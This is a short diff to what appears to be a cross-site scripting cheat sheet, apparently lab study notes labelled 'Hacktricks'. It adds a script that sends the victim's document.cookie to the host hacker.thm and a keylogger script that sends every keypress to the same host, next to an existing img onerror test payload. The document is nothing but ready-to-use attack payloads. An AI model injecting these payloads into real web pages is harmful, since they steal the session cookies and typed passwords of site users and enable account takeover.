@@ -2,3 +2,9 @@ Hacktricks:
 
 <img src=x onerror=alert(PAYLOAD)>
 
+steal cookie:
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+keylogger
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
